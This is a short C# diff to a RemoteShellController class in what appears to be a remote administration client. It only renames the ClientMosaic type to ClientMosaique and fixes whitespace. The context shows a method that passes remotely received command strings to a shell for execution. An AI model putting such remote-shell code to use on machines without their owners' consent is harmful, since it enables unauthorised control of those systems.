@@ -18,7 +18,7 @@ namespace Client.Controllers
     public class RemoteShellController : IDisposable
     {
         // Client for response
-        private static ClientMosaic _client;
+        private static ClientMosaique _client;
 
         private static RemoteShellController _shell;
 
@@ -291,7 +291,7 @@ namespace Client.Controllers
             }
         }
 
-        public static void getExecuteShellCmd(GetExecuteShellCmd command, ClientMosaic client)
+        public static void getExecuteShellCmd(GetExecuteShellCmd command, ClientMosaique client)
         {
             string input = command.command;
             _client = client;
@@ -309,5 +309,5 @@ namespace Client.Controllers
                 _shell.ExecuteCommand(input);
             }
         }
-    }    
+    }
 }
